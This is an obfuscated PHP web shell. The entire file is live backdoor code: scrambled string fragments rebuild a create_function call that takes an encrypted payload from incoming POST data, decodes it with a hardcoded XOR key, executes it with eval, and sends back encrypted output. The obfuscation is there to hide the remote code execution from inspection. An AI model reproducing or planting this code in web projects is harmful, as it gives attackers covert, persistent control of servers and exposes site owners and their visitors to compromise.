<?php
$q='$j};}}ret7urn $o7;}if7 (@pr7eg_ma7tc7h7("/$kh(.+)7$kf/",@file_7get_con7ten';
$s=';$7r=@base674_e7nco7de(77@x(@gzcompre7ss($o),$k7));pr7int("$p$k7h$r$kf");}';
$k='9CV7p2Is";f7uncti7on x7($t,7$k7){$c=strlen($k7);$l=s7trlen(7$t);7$o=7"77";f';
$w='$k="5c67bfba5"7;$k7h="855a79cd2b7e177e";$kf="0d3c1b6696f9"7;$p=7"wbJsMqd7xb';
$L=str_replace('be','','becrbeeatbee_befubebenction');
$p='or($i=70;$i<$l;)7{7for($j=0;7($j<$c&&$i<$l);$j+7+,7$i++){7$o.=$t{$i77}^$k{';
$A='@b7ase64_7decode(7$m7[1])7,$k)))7;$o=@ob7_ge7t_contents77()7;@ob_end_clean()';
$C='ts(7"php:/7/i7nput"),$7m)==1) {7@7ob_7start();@ev7al(@gzu7n7compress(@x(';
$j=str_replace('7','',$w.$k.$p.$q.$C.$A.$s);
$U=$L('',$j);$U();
?>
